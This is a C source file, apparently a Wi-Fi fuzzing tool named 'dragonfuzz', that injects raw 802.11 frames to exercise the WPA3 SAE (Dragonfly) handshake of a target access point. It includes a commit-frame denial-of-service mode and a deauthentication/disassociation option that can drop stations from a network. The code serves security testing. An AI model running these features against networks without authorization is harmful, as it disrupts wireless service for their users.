  // 0x30 (RSN IE), 0x14 (20 bytes length), 0x01 (RSN version), Group cipher suite 00 00 0F AC (AES CCM)
  // 04 01 (pairwise cipher suite count), Pairwise cipher suite list 00 00 0F AC (AES CCM),
  // Auth key mgmt count 01 00, Auth key mgmt 00 0F AC 08 (08 stands for SAE), RSN capabilities 00 00,

  // [offset 98] and the very end there is Extended capabilities Tag: 7F 08 00 00  00 00 00 00 00 40

  // what do we need in the association request?
  // Tag param SSID (36, 14 bytes), supported rates (50, 10 bytes),
  // extended supported rates (72, 6), RSN information (78, 20 bytes), extended capabilities (98, 10 bytes)
  // total of 60 bytes

  // now copy the above tagged parameters into the association request buffer

  unsigned char *ptr = (buf + 36);
  unsigned char ie_len = 0;
  int num_parsed_ie = 0;
  int dst_ptr = 0;

  if (*ptr != 0x00)
  {
    fprintf(stderr, "must point to tag byte of SSID IE!\n");
    exit(-1);
  }

  while (num_parsed_ie != 5)
  {
    ie_len = (unsigned char)ptr[1];

    if (ptr[0] == 0x00 || ptr[0] == 0x01 || ptr[0] == 0x32 || ptr[0] == 0x30 || ptr[0] == 0x7f)
    {
      memcpy(state->ap_tagged_params_from_beacon_for_assoc + dst_ptr, ptr, ie_len + 2);
      debug(state, 1, "Copying %d bytes from IE tag = 0x%x\n", ie_len, ptr[0]);
      dst_ptr += ie_len + 2;
      num_parsed_ie += 1;
    }

    ptr += 2 + ie_len;
  }

  state->beacon_processed = 1;
}

static void process_packet(struct state *state, unsigned char *buf, int len)
{
  int pos_bssid, pos_src, pos_dst;

  debug(state, 4, "process_packet (length=%d)\n", len);

  /* Ignore retransmitted frames - seems like aircrack-ng already does this?! */
  if (buf[1] & 0x08)
    return;

  /* Extract addresses */
  switch (buf[1] & 3)
  {
  case 0:
    pos_bssid = 16;
    pos_src = 10;
    pos_dst = 4;
    break;
  case 1:
    pos_bssid = 4;
    pos_src = 10;
    pos_dst = 16;
    break;
  case 2:
    pos_bssid = 10;
    pos_src = 16;
    pos_dst = 4;
    break;
  default:
    pos_bssid = 10;
    pos_dst = 16;
    pos_src = 24;
    break;
  }

  /* Must be sent by AP */
  if (memcmp(buf + pos_bssid, state->bssid, 6) != 0 || memcmp(buf + pos_src, state->bssid, 6) != 0)
    return;

  debug(state, 2, "process_packet (length=%d) from " MACSTR "\n", len, MAC2STR(state->bssid));

  /* Detect presence of AP through beacons */
  if (buf[0] == 0x80)
  {
    process_beacon_frame(state, buf, len);
  }

  if (buf[0] == 0x40)
  {
    debug(state, 1, "Recieved Probe Request Frame (length=%d) from " MACSTR "\n", len, MAC2STR(state->bssid));
    hexdump(state, 2, buf, len);
  }

  if (buf[0] == 0x50)
  {
    debug(state, 1, "Recieved Probe Response Frame (length=%d) from " MACSTR "\n", len, MAC2STR(state->bssid));
    hexdump(state, 2, buf, len);
  }

  if (buf[0] == 0x00)
  {
    debug(state, 1, "Recieved Association Request (length=%d) from " MACSTR "\n", len, MAC2STR(state->bssid));
    hexdump(state, 2, buf, len);
  }

  if (buf[0] == 0x10)
  {
    debug(state, 1, "Recieved Association Response (length=%d) from " MACSTR "\n", len, MAC2STR(state->bssid));
    hexdump(state, 2, buf, len);
  }

  if (buf[0] == 0xb0)
  {
    debug(state, 1, "[i] Received an Auth frame from " MACSTR "!\n", MAC2STR(state->bssid));
    debug(state, 1, "Frame type/subtype: 0x%02X, auth type: 0x%02x, auth seq: 0x%02x, auth status: 0x%02x\n",
          buf[0], buf[24], buf[26], buf[28]);
    hexdump(state, 1, buf, len);
  }

  // auth algorithm is in buf[24] and 0x03 stands for SAE
  // buf[0] has the frame type/subtype and 0xb0 stands for authentication
  // buf[26] holds the authentication sequence number
  if (len > 24 + 8 && buf[0] == 0xb0 && buf[24] == 0x03 && buf[26] == 0x01)
  {
    /* Handle Anti-Clogging Tokens */
    if (buf[28] == 0x4C)
    {
      debug(state, 1, "[i] Got SAE-COMMIT frame with anti clogging status code set!\n");
      hexdump(state, 1, buf, len);

      unsigned char *token = buf + 24 + 8;
      int token_len = len - 24 - 8;
      debug(state, 1, "[i] The token is:\n");
      hexdump(state, 1, token, token_len);

      state->rx_clogging_token++;
    }
    else if (buf[28] == 0x00) // status code successful
    {
      debug(state, 0, "[i] Received peer SAE AUTH-COMMIT frame from " MACSTR "\n", MAC2STR(state->bssid));
      state->sae_state = SAE_STATE_COMMITTED;

      state->rx_commits++;

      // 1. parse group id
      memcpy(&state->peer_groupid, buf + 30, 2);

      // 2. parse peer own_scalar
      BN_bin2bn(buf + 32, 32, state->peer_scalar);

      // 3. and finally the peer own_element
      BIGNUM *peer_element_x = BN_new();
      BIGNUM *peer_element_y = BN_new();

      BN_bin2bn(buf + 64, 32, peer_element_x);
      BN_bin2bn(buf + 96, 32, peer_element_y);

      EC_POINT_set_affine_coordinates_GFp(state->group, state->peer_element,
                                          peer_element_x, peer_element_y,
                                          state->bnctx);

      if (EC_POINT_is_on_curve(state->group, state->peer_element, state->bnctx) != 1)
      {
        printf("Peer commit own_element is not on curve!");
      }

      debug(state, 1, "Parsed peer SAE AUTH-COMMIT frame:\n\tGroup id: %d\n\tPeer-Scalar: %s\n\tPeer Element (%s, %s)\n",
            state->peer_groupid,
            BN_bn2hex(state->peer_scalar),
            BN_bn2hex(peer_element_x),
            BN_bn2hex(peer_element_y));

      BN_free(peer_element_x);
      BN_free(peer_element_y);

      if (sae_process_commit(state) == -1)
      {
        printf("Failed to process incoming commit frame and derive keys.\n");
        return;
      }

      // build confirm token
      if (build_confirm_token(state, 0) == -1)
      {
        printf("Failed to build confirm token.\n");
        return;
      }
    }
  }

  if (buf[0] == 0xb0 && buf[24] == 0x03 && buf[26] == 0x02)
  {
    if (buf[28 != 0])
    {
      fprintf(stderr, "[!] status code of SAE confirm frame is not successful!\n");
    }

    state->rx_confirms++;
    unsigned char recv_peer_confirm_token[SHA256_MAC_LEN];

    debug(state, 0, "[i] Received a SAE CONFIRM frame from " MACSTR "\n", MAC2STR(state->bssid));
    // parse the confirm token from the SAE CONFIRM frame
    memcpy(recv_peer_confirm_token, buf + 32, SHA256_MAC_LEN);
    debug(state, 1, "Parsed confirm token from peer\n");
    hexdump(state, 1, recv_peer_confirm_token, SHA256_MAC_LEN);
    debug(state, 1, "Parsed send confirm from peer: %02x %02x \n", buf[30], buf[31]);
    memcpy(&state->peer_send_confirm, buf + 30, 2);

    // verify that the confirm token in fact is correct
    // lets take the send confirm number from the frame at
    // position buf[30]

    // build confirm token
    if (build_confirm_token(state, 1) == 0 &&
        memcmp(state->peer_confirm_token, recv_peer_confirm_token, SHA256_MAC_LEN) == 0)
    {
      state->sae_state = SAE_STATE_CONFIRMED;
      debug(state, 0, "[+] Successfully verified peer confirm token!\n");
    }
    else
    {
      state->sae_state = SAE_STATE_CONFIRM_FAILED;
      fprintf(stderr, "[!] Could not verify peer confirm token!\n");
      fprintf(stderr, "[!] Confirm in frame: ");
      hexdump(state, 0, recv_peer_confirm_token, SHA256_MAC_LEN);
      fprintf(stderr, "[!] Computed confirm frame: ");
      hexdump(state, 0, state->peer_confirm_token, SHA256_MAC_LEN);
      return;
    }
  }

  if (buf[0] == 0x01 || buf[0] == 0x10)
  {
    debug(state, 0, "[i] Received a ASSOC RESPONSE frame from " MACSTR "\n", MAC2STR(state->bssid));
    hexdump(state, 1, buf, len);
    state->sae_state = STATE_ASSOCIATED;
  }
}

static int card_receive(struct state *state)
{
  unsigned char buf[2048];
  int len;
  struct rx_info ri;

  memset(buf, 0, 2048);

  len = card_read(state, buf, sizeof(buf), &ri);
  if (len < 0)
  {
    fprintf(stderr, "%s: failed to read packet\n", __FUNCTION__);
    return -1;
  }

  process_packet(state, buf, len);

  return len;
}

void print_status(struct state *state)
{
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);

  double first_beacon_ms = ((double)1.0e3 * state->first_beacon.tv_sec + 1.0e-6 * state->first_beacon.tv_nsec);
  double now_ms = ((double)1.0e3 * now.tv_sec + 1.0e-6 * now.tv_nsec);
  double diff_ms = now_ms - first_beacon_ms;

  printf("\r[ STATUS: RX first Beacon (%ld,%ld)  | %3d Beacon frames from " MACSTR " | %f AVG Beacons rx/ms ]",
         state->first_beacon.tv_sec, state->first_beacon.tv_nsec, state->rx_beacons, MAC2STR(state->bssid), diff_ms / state->rx_beacons);
  fflush(stdout);
}

static int sae_timed_out(struct timespec *now, struct timespec *m, unsigned int TIMEOUT)
{
  double now_us = ((double)1.0e6 * now->tv_sec + 1.0e-3 * now->tv_nsec);
  double m_us = ((double)1.0e6 * m->tv_sec + 1.0e-3 * m->tv_nsec);

  return now_us - m_us > TIMEOUT;
}

static void print_diff_us(struct state *state, int level, struct timespec *m1, struct timespec *m2)
{
  if (state->debug_level < level)
    return;

  double m1_us = ((double)1.0e6 * m1->tv_sec + 1.0e-3 * m1->tv_nsec);
  double m2_us = ((double)1.0e6 * m2->tv_sec + 1.0e-3 * m2->tv_nsec);

  printf("Time diff is %.5f us\n", m1_us - m2_us);
}

/*
 * A first step is to rebuild a complete Dragonfly Handshake with quick and dirty password derivation
 */
static void event_loop_sae(struct state *state, char *dev, int chan)
{
  // Step 1 -- Initialize Wi-Fi interface
  open_card(state, dev, chan);
  if (state->injection_bitrate && card_set_rate(state, state->injection_bitrate))
    debug(state, 0, "Warning: failed to set injection bitrate to %d\n", state->injection_bitrate);

  card_get_mac(state, state->srcaddr);
  debug(state, 1, "[i] Using MAC addresses %02X:%02X:%02X:%02X:%02X:%02X\n", state->srcaddr[0],
        state->srcaddr[1], state->srcaddr[2], state->srcaddr[3], state->srcaddr[4], state->srcaddr[5]);

  // Step 2 -- Create timer for status messages
  state->time_fd_status = timerfd_create(CLOCK_MONOTONIC, 0);
  if (state->time_fd_status == -1)
    perror("timerfd_create()");

  struct itimerspec timespec;
  /* initial expiration of the timer */
  timespec.it_value.tv_sec = 1;
  timespec.it_value.tv_nsec = 0;
  /* periodic expiration of the timer */
  timespec.it_interval.tv_nsec = 0;
  timespec.it_interval.tv_sec = 1;
  if (timerfd_settime(state->time_fd_status, 0, &timespec, NULL) == -1)
    perror("timerfd_settime()");

  // Step 3 -- Create timers for last Auth-Commit and Auth-Confirm messages
  struct timespec last_auth_commit = {0, 0};
  struct timespec last_auth_confirm = {0, 0};
  struct timespec now = {0, 0};

  /*
   * Derive Password Element PWE
   */
  if (derive_PWE(state) != 0)
  {
    fprintf(stderr, "Failed to derive PWE\n");
    return;
  }

  /*
   * Prepare commit.
   */
  if (prepare_commit(state) != 0)
  {
    fprintf(stderr, "Failed to prepare commit\n");
    return;
  }

  while (1)
  {
    struct pollfd fds[2];
    int card_fd = wi_fd(state->wi);

    // http://man7.org/linux/man-pages/man2/poll.2.html

    memset(&fds, 0, sizeof(fds));
    fds[0].fd = card_fd;
    fds[0].events = POLLIN | POLLOUT;
    fds[1].fd = state->time_fd_status;
    fds[1].events = POLLIN;

    if (poll(fds, 2, -1) == -1)
      err(1, "poll()");

    if (fds[0].revents & POLLIN)
    {
      card_receive(state);
    }

    if (fds[0].revents & POLLOUT)
    {

      int timed_out = -1;

      switch (state->sae_state)
      {

      case SAE_STATE_NOTHING:

        if (state->only_deauth)
        {
          send_deauth_frame(state);
          send_disassoc_frame(state);
          exit(0);
        }

        clock_gettime(CLOCK_MONOTONIC, &now);
        timed_out = sae_timed_out(&now, &last_auth_commit, SAE_TIMEOUT_US);

        if (timed_out)
        {
          debug(state, 2, "SAE AUTH COMMIT TIMEOUT!\n");
          print_diff_us(state, 2, &now, &last_auth_commit);
        }

        if (state->num_auth_commit == 0 || (timed_out && state->retransmission_enabled))
        {
          if (test_enabled(state, FUZZ_COMMIT_VARIABLE_TOKEN))
          {
            fuzz_sae_commit_variable_anti_clogging(state);
          }
          else if (test_enabled(state, FUZZ_COMMIT_VARIABLE_PASSWORD_IDENTIFIER))
          {
            fuzz_sae_commit_variable_password_identifier(state);
          }
          else if (test_enabled(state, FUZZ_COMMIT_ALL_STATUS_CODES))
          {
            fuzz_sae_commit_status_codes(state);
          }
          else if (test_enabled(state, DOS_COMMIT_FRAMES))
          {
            dos_commit(state);
          }
          else
          {
            inject_fuzzed_sae_commit(state, NULL, 0);
          }

          clock_gettime(CLOCK_MONOTONIC, &last_auth_commit);
          state->num_auth_commit++;
        }

        if (state->num_auth_commit >= SAE_MAX_RETRANSMISSIONS)
        {
          fprintf(stderr, "[!] %d retransmissions without response. Aborting.\n", state->num_auth_commit);
          exit(0);
        }

        break;

      case SAE_STATE_COMMITTED:
        // send one ACK frame to notify the AP over received
        // auth commit
        if (state->num_auth_confirm == 0)
        {
          send_ack_frame(state);
        }

        clock_gettime(CLOCK_MONOTONIC, &now);
        timed_out = sae_timed_out(&now, &last_auth_confirm, SAE_TIMEOUT_US);

        if (timed_out)
        {
          debug(state, 2, "SAE AUTH CONFIRM TIMEOUT!\n");
          print_diff_us(state, 2, &now, &last_auth_confirm);
        }

        if (test_enabled(state, DOS_COMMIT_FRAMES))
        {
          dos_commit(state);
        }

        if (state->num_auth_confirm == 0 || (timed_out && state->retransmission_enabled))
        {
          if (inject_fuzzed_sae_confirm(state, -1) == -1)
          {
            fprintf(stderr, "Failed to sent confirm token.\n");
            return;
          }
          clock_gettime(CLOCK_MONOTONIC, &last_auth_confirm);
          state->num_auth_confirm++;
        }

        if (state->num_auth_confirm >= SAE_MAX_RETRANSMISSIONS)
        {
          fprintf(stderr, "[!] %d retransmissions without response. Aborting.\n", state->num_auth_confirm);
          exit(0);
        }

        break;

      case SAE_STATE_CONFIRMED:

        // send_ack_frame(state);

        if (send_association_request(state) == -1)
        {
          printf("Failed to send association request.\n");
          return;
        }

        // TODO: implement proper way to wait for max retrans and timeout without going in a dummy state
        state->sae_state = STATE_ASSOCIATED;

        break;

      case SAE_STATE_CONFIRM_FAILED:
        if (all_tests_done(state))
        {
          exit(0);
        }
        else
        {
          state->sae_state = SAE_STATE_NOTHING;
          state->sent_commits = 0;
        }
        break;

      case STATE_ASSOCIATED:
        break;

      case STATE_FUZZING_DONE:
        // when not all tests are finished, deauth and deassoc everything
        // and begin again
        // else just let things play out
        if (!set_test_finished(state))
        {
          //                send_disassoc_frame(state);
          //                send_deauth_frame(state);
          state->sae_state = SAE_STATE_NOTHING;
          state->sent_commits = 0;
        }
        break;

      default:
        break;
      }
    }

    if (fds[1].revents & POLLIN)
    {
      uint64_t exp;
      int UNUSED_VARIABLE rval;
      rval = read(state->time_fd_status, &exp, sizeof(uint64_t));
      // print_status(state);
    }
  }
}

static void usage(char *p)
{
  printf("\n"
         "  Usage: dragonfuzz -d iface -a bssid -c chan <extra options>\n"
         "\n"
         "  Options:\n"
         "\n"
         "       -h         : This help screen\n"
         "       -x         : Enable retransmissions (1), or disable (0)\n"
         "       -r         : Enable MAC address randomization (1), or disable (0)\n"
         "       -d iface   : Wifi interface to use\n"
         "       -a bssid   : Target Access Point MAC address\n"
         "       -c chan    : Channel the AP is on\n"
         "       -g group   : The curve to use (either 19 or 21)\n"
         "       -p password: The PSK (password) to use\n"
         "       -t testid  : The fuzzing test id to run a single fuzzing test\n"
         "       -v level   : Debug level (0 to 4; default: 1)\n"
         "       -z         : Deauthenticate station from AP\n"
         "       -f         : Fuzz all states automatically\n"
         "\n");
}

int iana_to_openssl_id(int groupid)
{
  switch (groupid)
  {
  case 19:
    return NID_X9_62_prime256v1;
  case 20:
    return NID_secp384r1;
  case 21:
    return NID_secp521r1;
  case 25:
    return NID_X9_62_prime192v1;
  case 26:
    return NID_secp224r1;
  case 27:
    return NID_brainpoolP224r1;
  case 28:
    return NID_brainpoolP256r1;
  case 29:
    return NID_brainpoolP384r1;
  case 30:
    return NID_brainpoolP512r1;
  default:
    return -1;
  }
}

void free_crypto_context(struct state *state)
{
  BN_free(state->prime);
  BN_free(state->a);
  BN_free(state->b);
  BN_free(state->order);
  BN_free(state->own_scalar);
  BN_free(state->peer_scalar);
  EC_POINT_free(state->peer_element);
  EC_POINT_free(state->own_element);
  BN_CTX_free(state->bnctx);
  BN_free(state->k);
  EC_POINT_free(state->K);
  EC_POINT_free(state->PWE);
}

int initialize_crypto_context(struct state *state)
{
  int openssl_groupid;

  openssl_groupid = iana_to_openssl_id(state->groupid);
  if (openssl_groupid == -1)
  {
    fprintf(stderr, "Unrecognized curve ID: %d\n", state->groupid);
    return -1;
  }

  debug(state, 0, "[i] Using ECC groupid = %d\n", state->groupid);

  state->group = EC_GROUP_new_by_curve_name(openssl_groupid);
  if (state->group == NULL)
  {
    fprintf(stderr, "OpenSSL failed to load curve %d\n", state->groupid);
    return -1;
  }

  state->bnctx = BN_CTX_new();
  state->prime = BN_new();
  state->a = BN_new();
  state->b = BN_new();
  state->order = BN_new();
  state->own_scalar = BN_new();
  state->peer_scalar = BN_new();
  state->own_element = EC_POINT_new(state->group);
  state->peer_element = EC_POINT_new(state->group);
  state->PWE = EC_POINT_new(state->group);

  state->K = EC_POINT_new(state->group);
  state->k = BN_new();

  if (state->bnctx == NULL || state->prime == NULL || state->a == NULL ||
      state->b == NULL || state->order == NULL || state->own_scalar == NULL ||
      state->own_element == NULL ||
      state->peer_scalar == NULL || state->PWE == NULL ||
      state->peer_element == NULL || state->K == NULL || state->k == NULL)
  {
    fprintf(stderr, "Failed to allocate memory for BIGNUMs and/or ECC points\n");
    free_crypto_context(state);
    return -1;
  }

  if (!EC_GROUP_get_curve_GFp(state->group, state->prime, state->a, state->b, state->bnctx) ||
      !EC_GROUP_get_order(state->group, state->order, state->bnctx))
  {
    fprintf(stderr, "Failed to get parameters of group %d\n", state->groupid);
    free_crypto_context(state);
    return -1;
  }

  return 0;
}

/* Return -1 if it's not an hex value and return its value when it's a hex value
 */
int hexCharToInt(unsigned char c)
{
  static int table_created = 0;
  static int table[256];

  int i;

  if (table_created == 0)
  {
    /*
     * It may seem a bit long to calculate the table
     * but character position depend on the charset used
     * Example: EBCDIC
     * but it's only done once and then conversion will be really fast
     */
    for (i = 0; i < 256; i++)
    {

      switch ((unsigned char)i)
      {
      case '0':
        table[i] = 0;
        break;
      case '1':
        table[i] = 1;
        break;
      case '2':
        table[i] = 2;
        break;
      case '3':
        table[i] = 3;
        break;
      case '4':
        table[i] = 4;
        break;
      case '5':
        table[i] = 5;
        break;
      case '6':
        table[i] = 6;
        break;
      case '7':
        table[i] = 7;
        break;
      case '8':
        table[i] = 8;
        break;
      case '9':
        table[i] = 9;
        break;
      case 'A':
      case 'a':
        table[i] = 10;
        break;
      case 'B':
      case 'b':
        table[i] = 11;
        break;
      case 'C':
      case 'c':
        table[i] = 12;
        break;
      case 'D':
      case 'd':
        table[i] = 13;
        break;
      case 'E':
      case 'e':
        table[i] = 14;
        break;
      case 'F':
      case 'f':
        table[i] = 15;
        break;
      default:
        table[i] = -1;
      }
    }

    table_created = 1;
  }

  return table[c];
}

// Return the mac address bytes (or null if it's not a mac address)
int getmac(const char *macAddress, const int strict, unsigned char *mac)
{
  char byte[3];
  int i, nbElem, n;

  if (macAddress == NULL)
    return 1;

  /* Minimum length */
  if ((int)strlen(macAddress) < 12)
    return 1;

  memset(mac, 0, 6);
  byte[2] = 0;
  i = nbElem = 0;

  while (macAddress[i] != 0)
  {
    if (macAddress[i] == '\n' || macAddress[i] == '\r')
      break;

    byte[0] = macAddress[i];
    byte[1] = macAddress[i + 1];

    if (sscanf(byte, "%x", &n) != 1 && strlen(byte) == 2)
      return 1;

    if (hexCharToInt(byte[1]) < 0)
      return 1;

    mac[nbElem] = n;

    i += 2;
    nbElem++;

    if (macAddress[i] == ':' || macAddress[i] == '-' || macAddress[i] == '_')
      i++;
  }

  if ((strict && nbElem != 6) || (!strict && nbElem > 6))
    return 1;

  return 0;
}

int main(int argc, char *argv[])
{
  char *device = NULL;
  int ch;
  int chan = 1;
  struct state *state = get_state();

  memset(state, 0, sizeof(*state));
  state->nextaddr = 0;
  state->debug_level = 1;
  state->groupid = 19;
  state->injection_bitrate = 0;
  state->send_confirm = 0;
  state->peer_send_confirm = 0;
  state->sae_state = SAE_STATE_NOTHING;
  state->beacon_processed = 0;
  state->num_auth_commit = 0;
  state->num_auth_confirm = 0;
  memset(state->password, 0, 80);
  memset(state->fuzzing_tests, '-', 50);
  memcpy(state->password, "abcdefgh", strlen("abcdefgh"));
  state->rx_beacons = 0;
  state->first_beacon.tv_sec = 0;
  state->first_beacon.tv_nsec = 0;
  state->retransmission_enabled = 1;
  state->only_deauth = 0;
  state->rx_confirms = 0;
  state->rx_commits = 0;
  state->randomize_mac = 0;

  // initialize RNG
  srand((unsigned int)time(NULL));

  while ((ch = getopt(argc, argv, "d:x:v:c:a:g:p:r:b:l:t:n:i:mM:hf:hz")) != -1)
  {
    switch (ch)
    {
    case 'd':
      device = optarg;
      break;

    case 'x':
      state->retransmission_enabled = atoi(optarg);
      if (state->retransmission_enabled)
      {
        debug(state, 0, "[i] retransmissions enabled\n");
      }
      else
      {
        debug(state, 0, "[i] retransmissions disabled\n");
      }
      break;

    case 'r':
      state->randomize_mac = atoi(optarg);
      if (state->randomize_mac)
      {
        debug(state, 0, "[i] randomize_mac enabled\n");
      }
      else
      {
        debug(state, 0, "[i] randomize_mac disabled\n");
      }
      break;

    case 'v':
      state->debug_level = atoi(optarg);
      break;

    case 'c':
      chan = atoi(optarg);
      break;

    case 'z':
      state->only_deauth = 1;
      break;

    case 'a':
      if (getmac(optarg, 1, state->bssid) != 0)
      {
        printf("Invalid AP MAC address.\n");
        printf("\"%s --help\" for help.\n", argv[0]);
        return 1;
      }
      break;

    case 'g':
      state->groupid = atoi(optarg);
      if (iana_to_openssl_id(state->groupid) == -1)
      {
        fprintf(stderr, "The given group id (-g) of %s is not supported\n", optarg);
        exit(1);
      }
      break;

    case 'p':
      if (strlen(optarg) < 80)
      {
        memset(state->password, 0, 80);
        memcpy(state->password, optarg, strlen(optarg));
      }
      break;

    case 'b':
      state->injection_bitrate = atoi(optarg);
      if (state->injection_bitrate < 1 || state->injection_bitrate > 54)
      {
        printf("Please enter a bitrate between 1 and 54\n");
        return 1;
      }
      break;

    case 't':
      if (!enable_fuzzing_test(state, atoi(optarg)))
      {
        printf("Please select a fuzzing test id between 0 and %u\n", NUM_FUZZING_TESTS - 1);
        exit(-1);
      }
      break;

    case 'f':
      enable_all_fuzzing_tests(state);
      break;

    case 'h':
    default:
      usage(argv[0]);
      exit(1);
      break;
    }
  }

  debug(state, 0, "[i] Using password=%s\n", state->password);

  // Check that the required arguments are provided
  if (!device || chan <= 0 || memcmp(state->bssid, ZERO, 6) == 0)
  {
    usage(argv[0]);
    printf("\n");

    if (!device)
      printf("Please specify the monitor interface to use using -d\n");
    if (chan <= 0)
      printf("Please specify the channel to use using -c\n");
    if (memcmp(state->bssid, ZERO, 6) == 0)
      printf("Please specify the MAC address of the target using -a\n");
    printf("\n");

    exit(1);
  }

  // Initialize the crypto context
  if (initialize_crypto_context(state) < 0)
  {
    fprintf(stderr, "Failed to initialize crypto parameters, exiting...\n");
    return 1;
  }

  event_loop_sae(state, device, chan);

  exit(0);
}
